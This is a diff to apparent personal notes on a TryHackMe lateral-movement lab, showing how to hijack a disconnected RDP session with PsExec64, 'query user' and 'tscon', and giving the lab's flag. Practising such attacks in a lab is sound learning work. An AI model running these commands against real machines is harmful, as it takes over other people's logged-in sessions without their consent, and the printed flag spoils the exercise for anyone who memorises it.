@@ -1262,16 +1262,17 @@ Steps:
 
   1. Get SYSTEM (e.g., via PsExec64.exe -s cmd.exe).
   2. Run query user to list sessions.
-    ```
-    C:\> query user
-     USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
-    >administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
-     luke                                    3  Disc            .  4/6/2022 6:51 AM
-    ```
+
+```
+C:\> query user
+     USERNAME          SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+    >administrator     rdp-tcp#6          2   Active      .      4/1/2022 4:09 AM
+     luke                                 3   Disc        .      4/6/2022 6:51 AM
+```
 According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be rdp-tcp#6. We can also see that a user named luke has left a session open with id 3. Any session with a Disc state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.
 
-  3. Identify your own SESSIONNAME (e.g., rdp-tcp#6).
-  4. Hijack a disconnected session using:
+3. Identify your own SESSIONNAME (e.g., rdp-tcp#6).
+4. Hijack a disconnected session using:
     ```
     tscon <ID> /dest:<SESSIONNAME>
     ```
@@ -1281,31 +1282,33 @@ According to the command output above, if we were currently connected via RDP us
 
 - Get new credentials from the distributor link. (Must be from http://distributor.za.tryhackme.com/creds_t2)
 - RDP into THMJMP2 with those credentials.
-  ```
+```
   xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
-  ```
+```
 - Hijack any t1_toby.beck session marked Disc.
-  ```
+```
   cmd #(not powershell)
   PsExec64.exe -s cmd.exe
   query user
   ```
-  looks like 
-  ```
+looks like: 
+```
   C:\> query user
   USERNAME            SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
   >kelly.blake         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
   t1_toby.beck                            3  Disc            .  4/6/2022 6:51 AM
   t1_toby.beck1 ...
-  ```
-  Next take toby.beck id and use session name of kelly to take hijack RDP session
-  ```
-  tscon 3 /dest:rdp-tcp#6
-  ```
-  # RDP session jumps to t1_toby.beck
-  Just loading Win+r and cmd, shows command prompt with c:\users\t1_toby.beck> to see     its taken over toby.beck RDP session.
+```
+Next take toby.beck id and use session name of kelly to take hijack RDP session
+```
+tscon 3 /dest:rdp-tcp#6
+```
+### RDP session jumps to t1_toby.beck
+  
+- Just loading Win+r and cmd, shows command prompt with c:\users\t1_toby.beck> to see     its taken over toby.beck RDP session.
 - Retrieve the flag from inside the hijacked session.
-  # Paint loads and has same images as on desktop a command can simply load image and     make that image the wallpaper THM{NICE_WALLPAPER}
+- Paint loads and has same images as on desktop a command can simply load image and     make that image the wallpaper.
+- THM{NICE_WALLPAPER}
 
 
 
